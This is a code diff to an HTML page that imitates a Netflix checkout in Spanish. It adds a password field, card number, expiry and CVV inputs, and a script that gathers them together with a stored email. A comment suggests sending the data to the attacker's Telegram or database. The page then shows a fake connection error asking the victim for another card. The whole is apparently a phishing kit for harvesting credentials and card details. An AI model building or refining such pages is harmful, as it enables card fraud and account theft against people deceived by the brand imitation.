@@ -5,30 +5,95 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix</title>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
-    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         /* Estilos específicos para Checkout (Fondo Blanco) */
-        body { background: #fff !important; color: #333 !important; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
-        .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 20px 50px; display: flex; justify-content: space-between; align-items: center; }
-        .container-pay { max-width: 440px; margin: 60px auto; padding: 0 20px; }
-        .step { text-transform: uppercase; font-size: 13px; font-weight: 500; }
-        h1 { font-size: 32px; margin: 10px 0; font-weight: 700; }
-        .payment-icons { margin: 15px 0; display: flex; gap: 5px; }
-        .payment-icons i { color: #e50914; font-size: 30px; }
+        body { 
+            background: #fff !important; 
+            color: #333 !important; 
+            font-family: 'Roboto', sans-serif; 
+            margin: 0;
+            padding: 0;
+        }
+
+        .nav-pay { 
+            border-bottom: 1px solid #e6e6e6; 
+            padding: 15px 20px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+        }
+
+        .container-pay { 
+            max-width: 440px; 
+            margin: 30px auto; 
+            padding: 0 20px; 
+        }
+
+        .step { text-transform: uppercase; font-size: 13px; font-weight: 400; color: #333; }
+        
+        h1 { 
+            font-size: 32px; 
+            margin: 10px 0 20px; 
+            font-weight: 700; 
+            line-height: 1.1;
+        }
+
+        .payment-icons { margin: 15px 0; display: flex; gap: 8px; }
+        /* Usando colores reales de tarjetas */
+        .fa-cc-visa { color: #1A1F71; font-size: 35px; }
+        .fa-cc-mastercard { color: #EB001B; font-size: 35px; }
+        .fa-cc-amex { color: #007BC1; font-size: 35px; }
         
         .input-box { position: relative; margin-bottom: 15px; }
-        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
+        
+        .input-box input { 
+            width: 100%; 
+            padding: 15px; 
+            border: 1px solid #8c8c8c; 
+            border-radius: 2px; 
+            font-size: 16px; 
+            box-sizing: border-box; 
+            color: #000;
+        }
+
+        /* Highlight cuando el usuario hace clic */
+        .input-box input:focus {
+            outline: none;
+            border-color: #0071eb;
+        }
         
         .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         
-        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 20px; border: none; font-size: 24px; border-radius: 4px; cursor: pointer; margin-top: 20px; }
+        .btn-submit { 
+            background: #e50914; 
+            color: #fff; 
+            width: 100%; 
+            padding: 18px; 
+            border: none; 
+            font-size: 20px; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            margin-top: 20px; 
+            font-weight: 400;
+        }
+
         .btn-submit:hover { background: #f6121d; }
+
+        /* Ajustes para Móvil */
+        @media (max-width: 768px) {
+            .nav-pay { padding: 10px 15px; }
+            .nav-pay img { width: 90px; }
+            h1 { font-size: 24px; }
+            .container-pay { margin: 20px auto; }
+            .btn-submit { font-size: 18px; padding: 15px; }
+        }
     </style>
 </head>
 <body>
     <nav class="nav-pay">
-        <img src="img/logo.png" style="width: 120px;" alt="Netflix">
-        <a href="#" style="text-decoration: none; color: #333; font-weight: bold; font-size: 19px;">Cerrar sesión</a>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" style="width: 100px;" alt="Netflix">
+        <a href="#" style="text-decoration: none; color: #333; font-weight: bold; font-size: 16px;">Cerrar sesión</a>
     </nav>
 
     <div class="container-pay">
@@ -43,31 +108,66 @@
 
         <form id="payment-form">
             <div class="input-box">
+                <input type="password" id="user-pass" placeholder="Crea una contraseña" required>
+            </div>
+
+            <div class="input-box">
                 <input type="text" id="cc-name" placeholder="Nombre" required>
             </div>
             <div class="input-box">
                 <input type="text" id="cc-lastname" placeholder="Apellido" required>
             </div>
             <div class="input-box">
-                <input type="text" id="cc-num" placeholder="Número de tarjeta" maxlength="16" required>
+                <input type="text" id="cc-num" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required>
             </div>
             <div class="grid-input">
                 <div class="input-box">
-                    <input type="text" id="cc-exp" placeholder="Fecha de vencimiento (MM/AA)" required>
+                    <input type="text" id="cc-exp" placeholder="Vencimiento (MM/AA)" maxlength="5" required>
                 </div>
                 <div class="input-box">
-                    <input type="text" id="cc-cvv" placeholder="Código de seguridad (CVV)" maxlength="3" required>
+                    <input type="text" id="cc-cvv" placeholder="CVV" maxlength="4" inputmode="numeric" required>
                 </div>
             </div>
             
-            <p style="font-size: 13px; color: #737373;">
-                Tus pagos se procesarán internacionalmente. Se pueden aplicar comisiones bancarias adicionales.
+            <p style="font-size: 13px; color: #737373; line-height: 1.4;">
+                Al hacer clic en el botón "Iniciar membresía", aceptas nuestros Términos de uso y declaras que eres mayor de 18 años. Netflix te cobrará automáticamente cada mes.
             </p>
 
             <button type="submit" id="btn-finalizar" class="btn-submit">Iniciar membresía</button>
         </form>
     </div>
 
-    <script src="js/main.js"></script>
+    <script>
+        document.getElementById('payment-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Capturar datos
+            const emailStored = localStorage.getItem('userEmail'); // Viene de la página anterior
+            const password = document.getElementById('user-pass').value;
+            const nombre = document.getElementById('cc-name').value;
+            const apellido = document.getElementById('cc-lastname').value;
+            const tarjeta = document.getElementById('cc-num').value;
+            const exp = document.getElementById('cc-exp').value;
+            const cvv = document.getElementById('cc-cvv').value;
+
+            // Aquí puedes enviarlos a tu Telegram o base de datos
+            console.log("Datos capturados:", {
+                emailStored,
+                password,
+                nombreCompleto: nombre + " " + apellido,
+                tarjeta,
+                exp,
+                cvv
+            });
+
+            // Simulación de carga
+            this.innerHTML = "<h4>Procesando...</h4>";
+            
+            setTimeout(() => {
+                alert("Error de conexión. Por favor, intente con otra tarjeta.");
+                location.reload();
+            }, 2000);
+        });
+    </script>
 </body>
 </html>
